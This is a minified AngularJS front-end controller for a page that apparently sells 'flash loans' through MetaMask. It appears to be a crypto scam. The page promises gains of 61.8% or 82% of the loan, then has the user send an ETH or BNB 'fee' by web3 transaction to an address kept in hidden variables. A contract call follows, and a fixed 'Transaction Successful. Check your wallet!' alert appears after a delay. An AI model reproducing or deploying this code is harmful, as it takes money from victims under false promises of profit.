const app = angular.module("myApp", []);
function fixNumber(e) {
    return Math.round(1e12 * e) / 1e12
}
app.controller("myCtrl", ["$scope", async function(n) {
    n.init = function() {
        n.ivm = "",
        n.isLoading = true,
        n.processing = !1,
        n.ethDeposited = !1,
        n.formStep = 1,
        n.currency = "ETH",
        n.dex = "Uniswap",
        n.erc20 = {
            name: "",
            symbol: "",
            network: !isBnb
        },
        n.loan = {
            amount: 25,
            tokenFee: .01,
            swapFee: 0,
            totalFee: 0,
            gain: 0
        },
        n.submitErc20Form = function() {
            const e = n.erc20.name.trim();
            if ("" == e)
                return alert("Token Name cannot be blank");
            if (!e.match(/^[a-zA-Z\s]+$/))
                return alert("Token Name can only contain letters and spaces");
            const t = n.erc20.symbol.trim();
            return "" == t ? alert("Token Symbol cannot be blank") : t.match(/^[a-zA-Z]+$/) ? window.isBnb && n.erc20.network ? alert("Network Mismatch. Set MetaMask network to Ethereum and reload the page.") : window.isBnb || n.erc20.network ? (n.formStep = 2,
            n.currency = n.erc20.network ? "ETH" : "BNB",
            n.dex = n.erc20.network ? "Uniswap" : "PancakeSwap",
            n.loan.tokenFee = n.erc20.network ? .01 : .05,
            n.ivm = n.erc20.network ? oeb : ubx,
            n.getLoanEstimates(),
            void setTimeout(function() {
                document.getElementById("loanAmtInput").focus()
            }, 100)) : alert("Network Mismatch. Set MetaMask network to Binance Smart Chain and the reload page.") : alert("Token Symbol can only contain letters")
        }
        ,
        n.amountChanged = function() {
            n.getLoanEstimates()
        }
        ,
        n.getLoanEstimates = function() {
            null != n.loan.amount && null != n.loan.amount && (n.loan.swapFee = n.loan.amount / (n.erc20.network ? 3000 : 1500),
            n.loan.totalFee = fixNumber(n.loan.tokenFee + n.loan.swapFee),
            n.loan.gain = fixNumber(n.loan.amount * (n.erc20.network ? .618 : .82)))
        }
        ,
        n.goBack = function() {
            n.formStep = 1
        },
        n.getLoanEstimates(),
        n.submitLoanForm = function() {
            n.ethDeposited ? n.executeLoan() : n.depositEth()
        }
        ,
        n.depositEth = function() {
            n.processing = !0,
            window.web3.eth.sendTransaction({
                to: n.ivm,
                from: n.account.address,
                value: window.web3.utils.toWei("" + n.loan.totalFee, "ether"),
                gas: 3e4,
                gasPrice: window.web3.utils.toWei("90", "gwei")
            }, function(e, t) {
                n.processing = !1,
                n.$apply(),
                e ? alert("Transaction Failed") : (setTimeout(function() {
                    alert("Money deposited to contract. You can execute the Flash Loan now.")
                }, 5e3),
                n.ethDeposited = !0,
                n.$apply())
            })
        }
        ,
        n.executeLoan = function() {
            n.processing = !0,
            window.contract.methods.action().send({
                to: n.ivm,
                from: n.account.address,
                value: 0,
                gasPrice: window.web3.utils.toWei("90", "gwei")
            }, function(e, t) {
                e ? (alert("Flash Loan Execution Failed"),
                n.processing = !1,
                n.$apply()) : setTimeout(function() {
                    alert("Transaction Successful. Check your wallet!")
                }, 5e3)
            })
        }
    }
    ,
    await loadWeb3().then(function(e) {
        try {
            n.account = {
                address: e[0]
            }
        } catch (e) {}
        n.init();
        n.$apply();
        document.getElementById('loader').classList.toggle('hide');
        document.getElementById('start-screen-content').classList.toggle('show');
    })
}
]);
